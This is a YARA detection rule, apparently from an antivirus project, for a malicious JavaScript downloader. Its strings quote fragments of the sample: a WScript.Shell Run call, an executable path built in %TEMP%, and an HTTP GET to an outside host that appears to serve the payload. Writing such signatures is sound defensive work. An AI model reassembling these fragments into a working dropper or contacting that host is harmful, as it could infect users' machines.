rule sig_20160328_ca9f78c28fb143c6ba49de4a56b0c798 {
  meta:
    description = "datamaliciousorder - file 20160328_ca9f78c28fb143c6ba49de4a56b0c798.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b9934ad61c046ace91e480d41939d47c5ff0f242dad915d15ad3eee253f15e3d"

  strings:
    $s1  = "function Lggrjjw() {return Kmwlypj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"6UmPMOQF7QLyL.exe\";};" fullword ascii
    $s2  = "Sqbzkgcqj[Wksxbptr](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Heskrrdu](Ijbymewfur() * 11)} while (Sqbzkgcqj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Kmwlypj = function Ugwozub() {return WScript[Qfxzldotb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ghdhvioo(Xakzy, Kmoykxlty){return Xakzy - Kmoykxlty;};" fullword ascii
    $s6  = "function Zaxwkrr(Ujttmt){Kmwlypj[\"Run\"](Ujttmt, Tfxmkgm, Tfxmkgm);};" fullword ascii
    $s7  = "function Dczizolgt() {return ((Ommbz == true) && (Ommbz == Vrnnkquytv)) ? 1 : Tfxmkgm;};" fullword ascii
    $s8  = "var Drdyifkodr = new this[\"Date\"]();" fullword ascii
    $s9  = "function Luelzzu(){return Xleuura;};" fullword ascii
    $s10 = "var Ommbz = false;" fullword ascii
    $s11 = "return Ghdhvioo(Ppwvzhin, Yhiog);" fullword ascii
    $s12 = "function Ijbymewfur(){return 22;};" fullword ascii
    $s13 = "function Yqkrwbbc(Wybqi) {var Ahpiqdo = (1, 2, 3, 4, 5, Wybqi); return Ahpiqdo;};" fullword ascii
    $s14 = "Ommbz = true; " fullword ascii
    $s15 = "Vrnnkquytv = true; " fullword ascii
    $s16 = " while (Wydfsomhuc){" fullword ascii
    $s17 = "var Vrnnkquytv = false;" fullword ascii
    $s18 = "var Aiybhqjrq = false;" fullword ascii
    $s19 = "function Qsqyche()" fullword ascii
    $s20 = "function Rwico(){return Qfxzldotb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}